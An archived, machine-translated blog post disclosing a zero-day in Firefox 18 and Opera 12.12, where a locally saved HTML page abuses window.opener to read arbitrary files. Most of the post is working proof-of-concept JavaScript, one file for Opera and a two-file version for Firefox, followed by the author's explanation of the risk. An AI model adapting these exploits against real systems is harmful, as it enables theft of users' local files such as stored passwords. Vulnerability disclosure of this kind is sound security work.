<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Zero-day vulnerability in Firefox 18 and Opera 12.12</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Having continued to dig and beat the security issue with window.opener, I came across a rather amusing vulnerability in Firefox and Opera browsers. 
 ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Zero-day vulnerability in Firefox 18 and Opera 12.12</h1><div class="post__text post__text-html js-mediator-article">  Having continued to dig and beat the security issue with window.opener, I came across a rather amusing vulnerability in Firefox and Opera browsers. <br>  The vulnerability allows a page stored on your computer to read arbitrary files on your system. <br><br><a name="habracut"></a><br><br>  Vulnerability exists due to insufficient control over the change of window.opener. <br>  The attacker can embed an arbitrary HTML code into the page, and when the page is launched on the local system, it is possible to read the contents of almost any file (of course, with privileges). 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h1>  Opera </h1><br><br>  Because the vulnerability is pretty simple, I immediately publish exploit.  The window.opener problem can be found <a href="http://habrahabr.ru/post/164539/"><b>here</b></a> . <br><br><pre><code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="undefined"></span></code> </pre> <pre> <code class="hljs perl"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span>((navigator.userAgent.indexOf(<span class="hljs-string"><span class="hljs-string">"Opera"</span></span>) != -<span class="hljs-number"><span class="hljs-number">1</span></span>) &amp;&amp; (window.location.protocol == <span class="hljs-string"><span class="hljs-string">"file:"</span></span>)) { <span class="hljs-regexp"><span class="hljs-regexp">//</span></span>     Opera       file var file=prompt(<span class="hljs-string"><span class="hljs-string">"Example: C:/file.txt "</span></span>); <span class="hljs-regexp"><span class="hljs-regexp">//</span></span>   ? <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(file){ console.log(<span class="hljs-string"><span class="hljs-string">"File: "</span></span>+file); document.write(<span class="hljs-string"><span class="hljs-string">"&lt;center&gt;"</span></span>+ <span class="hljs-string"><span class="hljs-string">"&lt;a href='data:text/html,"</span></span>+ <span class="hljs-regexp"><span class="hljs-regexp">//</span></span> ,   data <span class="hljs-string"><span class="hljs-string">"&lt;script&gt;"</span></span>+ <span class="hljs-string"><span class="hljs-string">"if(window.opener){"</span></span>+ <span class="hljs-regexp"><span class="hljs-regexp">//</span></span>  window.opener  <span class="hljs-string"><span class="hljs-string">"window.opener.location.replace(%22file://"</span></span>+window.location.hostname+<span class="hljs-string"><span class="hljs-string">"/"</span></span>+file+<span class="hljs-string"><span class="hljs-string">"%22);"</span></span>+ <span class="hljs-regexp"><span class="hljs-regexp">//</span></span>        <span class="hljs-string"><span class="hljs-string">"};%3C%2Fscript%3E"</span></span>+ <span class="hljs-string"><span class="hljs-string">"%3Cscript%3E"</span></span>+ <span class="hljs-regexp"><span class="hljs-regexp">//</span></span>    script,    <span class="hljs-string"><span class="hljs-string">"alert(window.opener.document.body.innerHTML);"</span></span>+ <span class="hljs-regexp"><span class="hljs-regexp">//</span></span>   :) <span class="hljs-string"><span class="hljs-string">"%3C%2Fscript%3E"</span></span>+ <span class="hljs-string"><span class="hljs-string">"' target='_blank'&gt;"</span></span>+ <span class="hljs-regexp"><span class="hljs-regexp">//target</span></span>= _blank <span class="hljs-string"><span class="hljs-string">"CLICK-CLICK&lt;/a&gt;"</span></span>); }}</code> </pre> <pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br><br>  Video showing this vulnerability: <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/Gfiu2ypYN54" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br><h1>  Firefox </h1><br><br>  The vulnerability in this browser is similar, but here it is more difficult to exploit. <br><br>  For full access to the data, the code must be placed in the root of the disk. <br>  On nix'ah not tested, and therefore, the behavior of the code in nix'ah, I can not speak. <br>  Here the code consists of two files, to bypass restrictions in the browser. <br><br>  File first (Fir.html): <br><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="undefined"></span></code> </pre> <pre> <code class="hljs pgsql"> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>((navigator.userAgent.indexOf("Firefox") != <span class="hljs-number"><span class="hljs-number">-1</span></span>) &amp;&amp; (<span class="hljs-keyword"><span class="hljs-keyword">window</span></span>.<span class="hljs-keyword"><span class="hljs-keyword">location</span></span>.protocol == "file:")){ //     Firefox       file document.<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>("&lt;center&gt;"+ "&lt;a href='./payload.html'"+ // payload.html " target='_blank'&gt;CLICK-CLICK&lt;/a&gt;"); //target=_blank };</code> </pre><pre> <code class="hljs xml"> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br><br>  Second file (payload.html): <br><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="undefined"></span></code> </pre><pre> <code class="hljs mel">var <span class="hljs-keyword"><span class="hljs-keyword">file</span></span>=prompt(<span class="hljs-string"><span class="hljs-string">'Example: C:/file.txt'</span></span>); console.<span class="hljs-keyword"><span class="hljs-keyword">log</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">file</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">window</span></span>.opener.location=<span class="hljs-string"><span class="hljs-string">"file://localhost/"</span></span>+<span class="hljs-keyword"><span class="hljs-keyword">file</span></span>;</code> </pre> <pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="undefined"></span></code> </pre> <pre> <code class="hljs coffeescript">var al=function(){alert(<span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.opener.<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.body.innerHTML)}; <span class="hljs-regexp"><span class="hljs-regexp">//</span></span>  <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>(!<span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.opener.<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.body){ <span class="hljs-regexp"><span class="hljs-regexp">//</span></span><span class="hljs-built_in"><span class="hljs-built_in">window</span></span>.opener.<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.body=<span class="hljs-literal"><span class="hljs-literal">null</span></span> alert(<span class="hljs-string"><span class="hljs-string">'Click OK'</span></span>); <span class="hljs-regexp"><span class="hljs-regexp">//</span></span> al(); <span class="hljs-regexp"><span class="hljs-regexp">//</span></span>  };</code> </pre> <pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br><br>  Video: <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/d8cKh9Xd8GU" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br><h2>  Conclusion </h2><br><br>  The fact that exploit can only work while being on the target system does not make this vulnerability critical. <br>  However, those who like to keep pages on your computer, I ask you to carefully choose resources :) <br><br>  <b>UPD</b> <br>  For those who cannot understand why this is a vulnerability. <br><br>  I give an example: You found an interesting article on the Internet and suppose you are driving on nature.  There is no Internet, but you really want to read the article. <br>  But you, in advance, saved the HTML document on your computer.  And here you are sitting by the fire, you were bitten by mosquitoes and you decided to read this document.  Well, it is said, done!  Opened, read, forgotten. <br>  And in the afternoon you return home, and access to your account in the social.  there is no network.  After all, you left a login and password on the hard disk in the pass * .txt file. <br><br>  Do not consider this vulnerability as critical.  This is nothing more than a toy. <br>  But sometimes, even toys shoot;) <br><br>  <b>UPD2: it</b> is possible to browse directories, I won‚Äôt provide exploit, because it‚Äôs not good. </div><p>Source: <a href="https://habr.com/ru/post/165339/">https://habr.com/ru/post/165339/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../165323/index.html">We are driving a car with 2GIS</a></li>
<li><a href="../165325/index.html">DVD-RX fighting protection</a></li>
<li><a href="../165327/index.html">ORM or object-relational projector</a></li>
<li><a href="../165329/index.html">Getting rid of duplicate end-to-end code in PHP: code refactoring with AOP</a></li>
<li><a href="../165337/index.html">Visualization of computer usage statistics with R</a></li>
<li><a href="../165341/index.html">Samsung Galaxy Nexus with Ubuntu Phone OS is shown at CES 2013</a></li>
<li><a href="../165343/index.html">Run arbitrary code in Rails</a></li>
<li><a href="../165345/index.html">How valuable is your time? YouTrack and Pomodoro will help you find out.</a></li>
<li><a href="../165347/index.html">All the most important thing for the next "killer of Angry Birds"</a></li>
<li><a href="../165349/index.html">Exynos 5 - Samsung's new 8-core chip</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>